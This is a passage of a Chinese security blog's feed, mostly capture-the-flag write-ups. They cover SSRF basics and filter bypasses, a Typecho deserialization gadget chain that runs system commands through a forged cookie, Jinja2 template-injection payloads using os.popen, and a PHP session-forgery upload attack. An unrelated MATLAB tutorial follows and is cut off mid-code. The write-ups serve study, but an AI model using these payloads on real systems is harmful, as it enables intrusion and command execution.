src="/2020/11/01/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb/12.png" alt><br>访问<code>http://10.252.184.11/shell.php</code>得flag。。<br><pre class="line-numbers language-none"><code class="language-none">flag&#123;1a61913e-ab9d-4d76-bf5f-8feb3dca2222&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><blockquote><p>永远要做一个温柔的男孩子呀</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ssrf </tag>
            
            <tag> nmap </tag>
            
            <tag> Gopherus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="2020/11/01/SSRF/"/>
      <url>2020/11/01/SSRF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>检讨昨天没货，今天咋也得来一点。</p></blockquote><p><strong>下面是SSRF漏洞的简单介绍(真的就是非常简单的解释)</strong></p><p><a href="https://www.cnblogs.com/s0ky1xd/p/5859049.html">浅谈SSRFF漏洞</a><br><a href="https://www.jianshu.com/p/ad7b8079e0d5">SSRF</a></p><p><strong>一般解释</strong><br>SSRF(Server-Side Request Forgery:服务请求伪造)是一种由<code>攻击者构造</code>，从而<code>让服务端发起请求</code>的一种安全漏洞，它<code>将一个可以发起网络请求的服务当作跳板来攻击其他服务</code>，SSRF的<code>攻击目标一般是内网</code>。  </p><p><strong>出现的原因</strong><br>当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。</p><p><strong>SSRF的危害</strong></p><p>1.可以扫描内部网络<br>2.可以构造数据攻击内部主机</p><p><strong>产生的原因及一般原理</strong></p><p>产生的原因：<code>服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致可以从其他服务器的获取一定量的数据</code><br>例如：<br><code>http://www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p><blockquote><p>如果我们将<code>http://www.abc.com/1.jpg</code>换为与该服务器相连的内网服务器地址会产生什么效果呢？<br>如果存在该内网地址就会返回 <code>1xx</code> <code>2xx</code> 之类的状态码，不存在就会返回其他的状态码。</p></blockquote><p><strong>终极简析:</strong><br>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是<code>服务器并没有发现这个请求是非法的</code>，然后<code>服务器以它的身份来访问其他服务器的资源</code>。</p><p><strong>漏洞常见的位置</strong></p><pre class="line-numbers language-none"><code class="language-none">1&gt; 分享：通过URL地址分享网页内容2&gt; 转码服务3&gt; 在线翻译4&gt; 图片加载与下载：通过URL地址加载或下载图片5&gt; 图片、文章收藏功能6&gt; 未公开的api实现以及其他调用URL的功能7&gt; 从URL关键字中寻找<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>绕过过滤</strong></p><blockquote><p>下面为比较高级的教程了。<br><pre class="line-numbers language-none"><code class="language-none">* 使用&#96;@&#96;：http:&#x2F;&#x2F;www.abc.com@10.10.10.10 &#x3D; 10.10.10.10* IP地址转换成十进制、八进制：127.0.0.1 &#x3D; 2130706433* 使用短地址：http:&#x2F;&#x2F;10.10.116.11 &#x3D; http:&#x2F;&#x2F;t.cn&#x2F;RwbLKDx* 端口绕过：ip后面加一个端口* xip.io：10.0.0.1.xip.io &#x3D; 10.0.0.1        www.10.0.0.1.xip.io &#x3D; 10.0.0.1        mysite.10.0.0.1.xip.io &#x3D; 10.0.0.1        foo.bar.10.0.0.1.xip.io &#x3D; 10.0.0.1* 通过js跳转<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p></blockquote><p><strong>一般与各种（伪）协议联合使用</strong></p><blockquote><p>今天也是没有梦想的咸鱼。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF2020-EZ三剑客-EzTypecho</title>
      <link href="2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho/"/>
      <url>2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>年年岁岁花相似，岁岁年年人不同</p></blockquote><h2 id="1-typecho反序列化"><a href="#1-typecho反序列化" class="headerlink" title="1.typecho反序列化"></a>1.typecho反序列化</h2><p>这是个框架的反序列化题目，好在已经有不少人复现过这道题了，那我们就能直接拿来先用着了。。。</p><p><a href="https://www.cnblogs.com/litlife/p/10798061.html">Typecho-反序列化漏洞学习</a></p><h2 id="2-payload使用"><a href="#2-payload使用" class="headerlink" title="2.payload使用"></a>2.payload使用</h2><p>这个得出的payload为<br><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass Typecho_Feed&#123;private $_type;private $_items &#x3D; array();public function __construct()&#123;$this-&gt;_type &#x3D; &quot;RSS 2.0&quot;;$this-&gt;_items &#x3D; array(array(&quot;title&quot; &#x3D;&gt; &quot;test&quot;,&quot;link&quot; &#x3D;&gt; &quot;test&quot;,&quot;data&quot; &#x3D;&gt; &quot;20190430&quot;,&quot;author&quot; &#x3D;&gt; new Typecho_Request(),),);&#125;&#125;class Typecho_Request&#123;private $_params &#x3D; array();private $_filter &#x3D; array();public function __construct()&#123;$this-&gt;_params &#x3D; array(&quot;screenName&quot; &#x3D;&gt; &quot;eval(&#39;phpinfo();exit;&#39;)&quot;,);$this-&gt;_filter &#x3D; array(&quot;assert&quot;);&#125;&#125;$a &#x3D; new Typecho_Feed();$c &#x3D; array(&quot;adapter&quot; &#x3D;&gt; $a,&quot;prefix&quot; &#x3D;&gt; &quot;test&quot;,);echo base64_encode(serialize($c));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>得出的结果为</p><pre class="line-numbers language-none"><code class="language-none">YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjIzOiJldmFsKCdwaHBpbmZvKCk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>怎么用呢？</strong></p><p>先要把打开的界面调到安装的那里，就是下面的那样。。。<br><img src="/2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho/1.png" alt></p><p>然后抓包，传到<code>repeater模块</code>，伪造cookie为<br><pre class="line-numbers language-none"><code class="language-none">__typecho_config&#x3D;刚才的那个东西<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><strong>finish参数不可用</strong></p><p>结果按他的<code>/install.php?finish=a</code>得出下面的结果。<br><img src="/2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho/2.png" alt></p><p>下面的内容</p><pre class="line-numbers language-none"><code class="language-none">no, you can&#39;t unserialize it without session QAQ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>应该是我们的参数<code>finish</code>被限制了。然后看下<code>install.php</code>的源代码，找其他的可用参数。<br>发现<code>start</code>参数应该也可以用。<br><img src="/2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho/3.png" alt></p><pre class="line-numbers language-none"><code class="language-none">start&#x3D;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjIzOiJldmFsKCdwaHBpbmZvKCk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后用上面的payload就可以带出<code>ppinfo();</code>了。</p><h2 id="3-capture-the-flag"><a href="#3-capture-the-flag" class="headerlink" title="3.capture the flag"></a>3.capture the flag</h2><p>start=a<br>用下面的脚本得<code>cookie: __typecho_config=得出的结果</code><br><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass Typecho_Feed&#123;private $_type;private $_items &#x3D; array();public function __construct()&#123;$this-&gt;_type &#x3D; &quot;RSS 2.0&quot;;$this-&gt;_items &#x3D; array(array(&quot;title&quot; &#x3D;&gt; &quot;test&quot;,&quot;link&quot; &#x3D;&gt; &quot;test&quot;,&quot;data&quot; &#x3D;&gt; &quot;20190430&quot;,&quot;author&quot; &#x3D;&gt; new Typecho_Request(),),);&#125;&#125;class Typecho_Request&#123;private $_params &#x3D; array();private $_filter &#x3D; array();public function __construct()&#123;$this-&gt;_params &#x3D; array(&quot;screenName&quot; &#x3D;&gt; &quot;eval(&#39;system(\&#39;cat &#x2F;flag\&#39;);exit;&#39;)&quot;,     &#x2F;**注意这里要用system方法，并且要将单引号转义*&#x2F;);$this-&gt;_filter &#x3D; array(&quot;assert&quot;);&#125;&#125;$a &#x3D; new Typecho_Feed();$c &#x3D; array(&quot;adapter&quot; &#x3D;&gt; $a,&quot;prefix&quot; &#x3D;&gt; &quot;test&quot;,);echo base64_encode(serialize($c));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>最终的<code>REQUEST</code><br><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;install.php?start&#x3D;a HTTP&#x2F;1.1Host: 48246e94-c403-49c5-ab38-ebb096fd656c.node3.buuoj.cnUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko&#x2F;20100101 Firefox&#x2F;82.0Accept: text&#x2F;html,application&#x2F;xhtml+ xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateReferer: http:&#x2F;&#x2F;48246e94-c403-49c5-ab38-ebb096fd656c.node3.buuoj.cn&#x2F;install.phpContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 0Origin: http:&#x2F;&#x2F;48246e94-c403-49c5-ab38-ebb096fd656c.node3.buuoj.cnConnection: closeCookie: __typecho_lang&#x3D;zh_CN; __typecho_config&#x3D;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo0OntzOjU6InRpdGxlIjtzOjQ6InRlc3QiO3M6NDoibGluayI7czo0OiJ0ZXN0IjtzOjQ6ImRhdGEiO3M6ODoiMjAxOTA0MzAiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjM1OiJldmFsKCdzeXN0ZW0oXCdjYXQgL2ZsYWdcJyk7ZXhpdDsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGVzdCI7fQ&#x3D;&#x3D;Upgrade-Insecure-Requests: 1Cache-Control: max-age&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><img src="/2020/10/31/GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzTypecho/4.png" alt></p><p><strong><code>flag:  flag&#123;78b38374-212a-4f5b-9c5e-04bb9dc0d801&#125;</code></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> typecho反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RootersCTF2019-I_&lt;3_Flask</title>
      <link href="2020/10/30/RootersCTF2019-I-3-Flask/"/>
      <url>2020/10/30/RootersCTF2019-I-3-Flask/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>原来现在你不珍惜的，将来真的会有人替你去珍惜。</p></blockquote><h3 id="1-arjun工具"><a href="#1-arjun工具" class="headerlink" title="1.arjun工具"></a>1.arjun工具</h3><p>这是个解析<code>http参数</code>的工具。</p><blockquote><p>用户可以使用下列命令查找GET参数：<br><pre class="line-numbers language-none"><code class="language-none">python3 arjun.py -u http:&#x2F;&#x2F;c7bb25cf-ab60-4b15-b3c7-c7e75d46691c.node3.buuoj.cn&#x2F; --get<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>类似的，用户可以使用—post来查找POST请求。</p></blockquote><p><a href="https://www.freebuf.com/sectool/200175.html">使用方法</a></p><p>一般情况下就用上面的命令就可了。</p><p>这个因为环境反应速度太慢了，没搞出来，有点小小的遗憾吧。</p><p>但是看wp得知这个有个get的参数<code>name</code>。</p><h2 id="2-模版注入"><a href="#2-模版注入" class="headerlink" title="2.模版注入"></a>2.模版注入</h2><p>根据提示<code>flask</code>想到是模版注入，传参<code>/?name=&#123;&#123;7*7&#125;&#125;</code>，返回的内容为<code>I ♥ Flask &amp; 49</code>可判断确实是模版注入，那用得是哪个模板呢？</p><p>~</p><h2 id="3-tplmap工具"><a href="#3-tplmap工具" class="headerlink" title="3.tplmap工具"></a>3.tplmap工具</h2><p><a href="https://github.com/epinna/tplmap">这个工具</a>是个判断用的是哪个框架的工具，具体的使用方法就是<br><pre class="line-numbers language-none"><code class="language-none">python .&#x2F;tplmap.py -u &#39;http:&#x2F;&#x2F;www.target.com&#x2F;page?name&#x3D;John&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>就是想上面那样用，然后对于我们这道题，利用的语句就是<br><pre class="line-numbers language-none"><code class="language-none">python tplmap.py -u http:&#x2F;&#x2F;c7bb25cf-ab60-4b15-b3c7-c7e75d46691c.node3.buuoj.cn&#x2F;?name&#x3D; --os-shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>~</p><p>下面是<code>jinja2模版注入的常用payload</code>，网上别人总结的一大堆，有空可总结一下。<br><pre class="line-numbers language-none"><code class="language-none">&#x2F;?name&#x3D;&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;&#x2F;?name&#x3D;&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag.txt&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><p>直接获得flag。</p><h2 id="4-flag"><a href="#4-flag" class="headerlink" title="4.flag"></a>4.flag</h2><p><img src="/2020/10/30/RootersCTF2019-I-3-Flask/1.png" alt><br><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">I ♥ Flask &amp; flag&#123;211cf5b3-8647-44a5-90d5-b0a489262a4e&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><blockquote><p>人生如白驹过隙，忽然而已。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> arjun </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HFCTF2020-BabyUpload</title>
      <link href="2020/10/30/HFCTF2020-BabyUpload/"/>
      <url>2020/10/30/HFCTF2020-BabyUpload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>不是我不明白，这世界变化太快。</p></blockquote><h2 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h2><p>下面是源码<br><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);session_save_path(&quot;&#x2F;var&#x2F;babyctf&#x2F;&quot;);session_start();require_once &quot;&#x2F;flag&quot;;highlight_file(__FILE__);&#x2F;*下面是得flag的地方*&#x2F;if($_SESSION[&#39;username&#39;] &#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;    $filename&#x3D;&#39;&#x2F;var&#x2F;babyctf&#x2F;success.txt&#39;;    if(file_exists($filename))&#123;            safe_delete($filename);            die($flag);    &#125;&#125;else&#123;    $_SESSION[&#39;username&#39;] &#x3D;&#39;guest&#39;;&#125;$direction &#x3D; filter_input(INPUT_POST, &#39;direction&#39;);$attr &#x3D; filter_input(INPUT_POST, &#39;attr&#39;);$dir_path &#x3D; &quot;&#x2F;var&#x2F;babyctf&#x2F;&quot;.$attr;if($attr&#x3D;&#x3D;&#x3D;&quot;private&quot;)&#123;    $dir_path .&#x3D; &quot;&#x2F;&quot;.$_SESSION[&#39;username&#39;];&#125;if($direction &#x3D;&#x3D;&#x3D; &quot;upload&quot;)&#123;    try&#123;        if(!is_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]))&#123;            throw new RuntimeException(&#39;invalid upload&#39;);        &#125;        $file_path &#x3D; $dir_path.&quot;&#x2F;&quot;.$_FILES[&#39;up_file&#39;][&#39;name&#39;];        $file_path .&#x3D; &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;]);        if(preg_match(&#39;&#x2F;(\.\.\&#x2F;|\.\.\\\\)&#x2F;&#39;, $file_path))&#123;            throw new RuntimeException(&#39;invalid file path&#39;);        &#125;        @mkdir($dir_path, 0700, TRUE);        if(move_uploaded_file($_FILES[&#39;up_file&#39;][&#39;tmp_name&#39;],$file_path))&#123;            $upload_result &#x3D; &quot;uploaded&quot;;        &#125;else&#123;            throw new RuntimeException(&#39;error while saving&#39;);        &#125;    &#125; catch (RuntimeException $e) &#123;        $upload_result &#x3D; $e-&gt;getMessage();    &#125;&#125; elseif ($direction &#x3D;&#x3D;&#x3D; &quot;download&quot;) &#123;    try&#123;        $filename &#x3D; basename(filter_input(INPUT_POST, &#39;filename&#39;));        $file_path &#x3D; $dir_path.&quot;&#x2F;&quot;.$filename;        if(preg_match(&#39;&#x2F;(\.\.\&#x2F;|\.\.\\\\)&#x2F;&#39;, $file_path))&#123;            throw new RuntimeException(&#39;invalid file path&#39;);        &#125;        if(!file_exists($file_path)) &#123;            throw new RuntimeException(&#39;file not exist&#39;);        &#125;        header(&#39;Content-Type: application&#x2F;force-download&#39;);        header(&#39;Content-Length: &#39;.filesize($file_path));        header(&#39;Content-Disposition: attachment; filename&#x3D;&quot;&#39;.substr($filename, 0, -65).&#39;&quot;&#39;);        if(readfile($file_path))&#123;            $download_result &#x3D; &quot;downloaded&quot;;        &#125;else&#123;            throw new RuntimeException(&#39;error while saving&#39;);        &#125;    &#125; catch (RuntimeException $e) &#123;        $download_result &#x3D; $e-&gt;getMessage();    &#125;    exit;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><pre class="line-numbers language-none"><code class="language-none">if($_SESSION[&#39;username&#39;] &#x3D;&#x3D;&#x3D; &#39;admin&#39;)&#123;    $filename&#x3D;&#39;&#x2F;var&#x2F;babyctf&#x2F;success.txt&#39;;    if(file_exists($filename))&#123;            safe_delete($filename);            die($flag);    &#125;&#125;else&#123;    $_SESSION[&#39;username&#39;] &#x3D;&#39;guest&#39;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>上面的要求就是<code>username</code>的值为<code>admin</code>，并且<code>filename</code>的值为<code>/var/babyctf/success.txt</code>就能die出flag啦</strong></p><h2 id="2-upload"><a href="#2-upload" class="headerlink" title="2.upload"></a>2.upload</h2><p>首先得想办法改session，那就得想办法查看session的编码，查看session编码的payload：<code>POST</code>:<code>direction=download&amp;attr=.&amp;filename=sess_+phpsessid</code><br><img src="/2020/10/30/HFCTF2020-BabyUpload/1.png" alt></p><p>看wp对session的存储方式不同</p><blockquote><p>php_binary:存储方式是，<code>键名的长度对应的ASCII字符</code>+<code>键名</code>+<code>经过serialize()函数序列化处理</code>的值<br>php:存储方式是，<code>键名</code>+<code>竖线</code>+<code>经过serialize()函数序列处理</code>的值<br>php_serialize(php&gt;5.5.4):存储方式是，<code>经过serialize()函数序列化处理</code>的值</p></blockquote><p>然后这里看到有个不可见字符，那对应的就是第一种情况了，而且可以说明这个<code>键名长度对应的ASCII字符</code>不可见。</p><p>在本地伪造session文件。<br><pre class="line-numbers language-none"><code class="language-none">&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);session_save_path(&quot;F:&#x2F;&#x2F;&quot;);session_start();$_SESSION[&#39;username&#39;] &#x3D; &#39;admin&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p><strong>文件生成成功</strong><br><img src="/2020/10/30/HFCTF2020-BabyUpload/2.png" alt></p><p>然后将文件改名为sess，并进行<code>sha256</code>编码，<br><pre class="line-numbers language-none"><code class="language-none">&lt;?phpecho hash_file(&#39;sha256&#39;, &#39;F:&#x2F;&#x2F;sess&#39;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><p>获得<br>session<br><pre class="line-numbers language-none"><code class="language-none">filename&#x3D;sess_432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><strong>伪造文件成功</strong></p><p>现在就要把sess文件上传上去了，用下面的页面（跟着大师傅，总能学点新颖的操作）<br><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;    &lt;head&gt;        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;&#x2F;head&gt;    &lt;body&gt;        &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;85daafec-8582-4f39-b121-8ab733bdf710.node3.buuoj.cn&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;up_file&quot; &#x2F;&gt;        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;attr&quot; value&#x3D;&quot;.&quot;&gt;        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;direction&quot; value&#x3D;&quot;upload&quot;&gt;        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;        &lt;&#x2F;form&gt;    &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/2020/10/30/HFCTF2020-BabyUpload/3.png" alt></p><p>然后上传我们伪造的文件就ok了。<br><img src="/2020/10/30/HFCTF2020-BabyUpload/4.png" alt></p><p><strong>创建success.txt文件成功</strong></p><p>文件内容改为以下，就改了个<code>.</code>为<code>success.txt</code>。<br><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;    &lt;head&gt;        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;    &lt;&#x2F;head&gt;    &lt;body&gt;        &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;85daafec-8582-4f39-b121-8ab733bdf710.node3.buuoj.cn&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;up_file&quot; &#x2F;&gt;        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;attr&quot; value&#x3D;&quot;success.txt&quot;&gt;        &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;direction&quot; value&#x3D;&quot;upload&quot;&gt;        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;        &lt;&#x2F;form&gt;    &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>在上传一次<code>sess</code>文件就可了。</p><p><strong>获得flag</strong></p><p>然后回到刚才的界面内，改下<code>phpsessid</code>为<code>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code>，改<code>attr</code>对应的值为<code>success.txt</code>获得flag<br><img src="/2020/10/30/HFCTF2020-BabyUpload/6.png" alt><br><img src="/2020/10/30/HFCTF2020-BabyUpload/5.png" alt></p><p>flag为<code>flag&#123;f1dd4295-4d54-4f6d-a5ad-37f07f79c74b&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> php代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matlab学习之二</title>
      <link href="2020/10/28/matlab%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BA%8C/"/>
      <url>2020/10/28/matlab%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>运算符部分先跳过，ye就是懒懒懒狗</p></blockquote><h2 id="1-matlab绘图"><a href="#1-matlab绘图" class="headerlink" title="1.matlab绘图"></a>1.matlab绘图</h2><p>先定义<code>x</code>得范围，然后定义<code>y=f(x)</code>，然后执行<code>plot(x, y)</code>，就能画出曲线了，下面是测试的代码与测试结果<br><pre class="line-numbers language-none"><code class="language-none">x &#x3D; [0:5:100];    %这里表示x的范围为从0到100，增量为5y &#x3D; x;plot(x, y)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>上面的图形是条直线。<br><img src="/2020/10/28/matlab%E5%AD%A6%E4%B9%A0%E4%B9%8B%E4%BA%8C/1.png" alt></p><p><strong>y=x^2的图像脚本如下</strong><br><pre class="line-numbers language-none"><code class="language-none">x &#x3D; [-100:10:100];y &#x3D; 